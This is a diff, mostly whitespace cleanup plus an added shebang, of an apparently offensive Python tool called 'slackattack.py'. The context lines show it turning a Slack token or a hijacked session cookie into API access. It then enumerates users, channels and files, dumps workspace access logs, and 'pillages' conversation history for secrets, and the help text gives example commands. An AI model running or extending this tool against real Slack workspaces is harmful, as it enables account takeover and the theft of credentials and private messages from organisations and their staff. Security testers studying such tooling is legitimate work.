@@ -1,3 +1,4 @@
+#!/usr/bin/python3
 import argparse
 import requests
 import os
@@ -6,8 +7,8 @@ import hashlib
 import re
 import uuid
 import urllib3
-from termcolor import colored   
-import json 
+from termcolor import colored
+import json
 from banner import get_main_banner, get_sub_banner
 
 verbose = False
@@ -78,13 +79,13 @@ LINKS_QUERIES = "|".join(["amazonaws",
 
 def make_cookie_request(workspace_url, user_cookie, proxy=None, verify_ssl=False):
     try:
-        # remove extra 'd='  from cookie 
+        # remove extra 'd='  from cookie
         user_cookie = re.sub(r'^d=', '', user_cookie)
 
         response = requests.get(workspace_url, cookies={'d': user_cookie}, proxies={'http': proxy, 'https': proxy}, verify=verify_ssl)
         response.raise_for_status()
 
-        # Extract user session token using regex 
+        # Extract user session token using regex
         user_session_token_match = re.search(r'(xox[a-zA-Z]-[a-zA-Z0-9-]+)', response.text)
         if user_session_token_match:
             return user_session_token_match.group(0)
@@ -112,7 +113,7 @@ def make_slack_request(url, credentials, method="POST", payload=None, proxy=None
             "Cookie": f"{credentials['cookie']}",
         }
 
-        # Create the payload for the POST request body 
+        # Create the payload for the POST request body
         payload = (
             f"--{boundary}\r\n"
             f"Content-Disposition: form-data; name=\"token\"\r\n\r\n"
@@ -145,21 +146,21 @@ def make_slack_request(url, credentials, method="POST", payload=None, proxy=None
             print("Request failed.")
             print(f"Error message: {data.get('error', 'N/A')}")
 
-        return data   
+        return data
 
     except requests.exceptions.RequestException as exception:
         print(f"[ERROR]: {exception}")
-        return None   
+        return None
 
 def test_credentials(credentials, proxy, verify_ssl=False):
     if 'token' in credentials:
         test_url = "https://slack.com/api/auth.test"
-        payload = None   
+        payload = None
 
         response = make_slack_request(test_url, credentials, method="POST", payload=payload, proxy=proxy, verify_ssl=verify_ssl)
         if response:
             print("Response:")
-            print(json.dumps(response, indent=4))   
+            print(json.dumps(response, indent=4))
 
     elif 'cookie' in credentials:
         user_session_token = make_cookie_request(credentials['workspace_url'], credentials['cookie'], proxy, verify_ssl)
@@ -171,12 +172,12 @@ def test_credentials(credentials, proxy, verify_ssl=False):
         response = make_slack_request(test_url, credentials, method="POST", payload=user_session_token, proxy=proxy, verify_ssl=verify_ssl)
         if response:
             print("Response:")
-            print(json.dumps(response, indent=4))   
+            print(json.dumps(response, indent=4))
 
 def list_channels(credentials, proxy, verify_ssl=False):
     if 'token' in credentials:
         test_url = "https://slack.com/api/conversations.list"
-        payload = None   
+        payload = None
 
         response = make_slack_request(test_url, credentials, method="POST", payload=payload, proxy=proxy, verify_ssl=verify_ssl)
         if response:
@@ -208,7 +209,7 @@ def list_file_urls(credentials, channel, proxy, verify_ssl=False):
 
     if 'token' in credentials:
         test_url = "https://slack.com/api/files.list"
-        payload = None   
+        payload = None
 
         response_data = make_slack_request(test_url, credentials, method="POST", payload=payload, proxy=proxy, verify_ssl=verify_ssl)
 
@@ -232,7 +233,7 @@ def list_files(credentials, proxy, verbose=False, verify_ssl=False):
 
     if 'token' in credentials:
         test_url = "https://slack.com/api/files.list"
-        payload = None   
+        payload = None
 
         response_data = make_slack_request(test_url, credentials, method="POST", payload=payload, proxy=proxy, verify_ssl=verify_ssl)
 
@@ -288,7 +289,7 @@ def list_user_list(credentials, proxy=None, verify_ssl=False):
 
     if 'token' in credentials:
         test_url = "https://slack.com/api/users.list"
-        payload = None   
+        payload = None
 
         response = make_slack_request(test_url, credentials, method="POST", payload=payload, proxy=proxy, verify_ssl=verify_ssl)
 
@@ -306,7 +307,7 @@ def list_user_list(credentials, proxy=None, verify_ssl=False):
             return
 
         test_url = "https://slack.com/api/users.list"
-        payload = None  
+        payload = None
         response = make_slack_request(test_url, credentials, method="POST", payload=payload, proxy=proxy, verify_ssl=verify_ssl)
 
         if response is not None and response.get("ok"):
@@ -320,7 +321,7 @@ def check_user_membership(credentials, channel_id):
         url = f"https://slack.com/api/conversations.members?channel={channel_id}"
         headers = {"Authorization": f"Bearer {credentials['token']}"}
     elif 'cookie' in credentials:
-        url = f"https://slack.com/api/conversations.members?channel={channel_id}" 
+        url = f"https://slack.com/api/conversations.members?channel={channel_id}"
         headers = {"Cookie": f"{credentials['cookie']}"}
 
     response = requests.get(url, headers=headers)
@@ -422,7 +423,7 @@ def check_permissions(credentials, use_proxy=False, proxy_url=None, verify_ssl=F
             },
             "Available Flags": available_flags,
         }
-    
+
 def check_dump_logs_permission(credentials, proxy=None, verify_ssl=False):
     if 'token' in credentials:
         url = "https://slack.com/api/team.accessLogs"
@@ -464,11 +465,11 @@ def dump_logs(credentials, proxy=None, verify_ssl=False, verbose=False):
             return
 
         test_url = "https://slack.com/api/team.accessLogs"
-        payload = None  
+        payload = None
         response = make_slack_request(test_url, credentials, method="POST", payload=payload, proxy=proxy, verify_ssl=verify_ssl)
 
     if isinstance(response, dict):
-        data = response   
+        data = response
     elif response:
         try:
             data = response.json()
@@ -517,12 +518,12 @@ def pillage_conversations(credentials, proxy, verify_ssl=False):
             sender_info = f"User ID: {message.get('user', 'N/A')}, Username: {message.get('username', 'N/A')}"
 
             text = message.get('text', '')
-            find_secrets_in_text(channel_name, channel_id, timestamp, sender_info, text) 
+            find_secrets_in_text(channel_name, channel_id, timestamp, sender_info, text)
 
 def retrieve_conversation_messages(credentials, conversation_id, proxy, verify_ssl=False):
     if 'token' in credentials:
         test_url = f"https://slack.com/api/conversations.history?channel={conversation_id}"
-        payload = None  
+        payload = None
 
         response = make_slack_request(test_url, credentials, method="GET", payload=payload, proxy=proxy, verify_ssl=verify_ssl)
 
@@ -605,7 +606,7 @@ def find_secrets_in_text(channel_name, channel_id, timestamp, sender_info, text)
 def save_output_to_json(data, filename):
     with open(filename, 'w') as json_file:
         json.dump(data, json_file, indent=2)
-    
+
 class ExamplesAction(argparse.Action):
     def __call__(self, parser, namespace, values, option_string=None):
         examples = """
@@ -617,7 +618,7 @@ class ExamplesAction(argparse.Action):
             python slackattack.py --token xoxb-1234567890 --test
             python slackattack.py --token xoxb-1234567890 --check-permissions
             python slackattack.py --token xoxb-1234567890 --pillage
-        
+
         Using a user-supplied cookie:
             python slackattack.py --cookie xoxd-abcdefghijklmn --workspace-url https://your-workspace.slack.com --list-users
             python slackattack.py --cookie xoxd-abcdefghijklmn --workspace-url https://your-workspace.slack.com --list-channels
@@ -639,7 +640,7 @@ def main():
     group.add_argument("--token", type=str, help="Slack API token")
     group.add_argument("--cookie", type=str, help="User-supplied cookie")
     parser.add_argument("--workspace-url", type=str, help="Workspace URL for authenticating user session token")
-    
+
     parser.add_argument("--pillage", action='store_true', help="Search conversations for secrets")
     parser.add_argument("--output-json", "-o", type=str, help="Save output in JSON format to the specified file")
 
@@ -709,7 +710,7 @@ def main():
             save_output_to_json(output_data, args.output_json)
         else:
             print(json.dumps(output_data, indent=2))
-    
+
 #    elif args.list_file_urls:
 #        channel_list = list_channels(credentials, proxy)
 #        for channel in channel_list:
@@ -766,8 +767,8 @@ def main():
             print(json.dumps(output_data, indent=2))
 
     elif args.check_permissions:
-        proxy = args.proxy  
-        permissions = check_permissions(credentials, use_proxy=True, proxy_url=proxy) 
+        proxy = args.proxy
+        permissions = check_permissions(credentials, use_proxy=True, proxy_url=proxy)
         print("API Token Permissions:")
         for endpoint, permission in permissions['API Token Permissions'].items():
             print(f"{endpoint}: {permission}")
@@ -801,4 +802,4 @@ def main():
             print(json.dumps(output_data, indent=2))
 
 if __name__ == "__main__":
-    main() 
+    main()
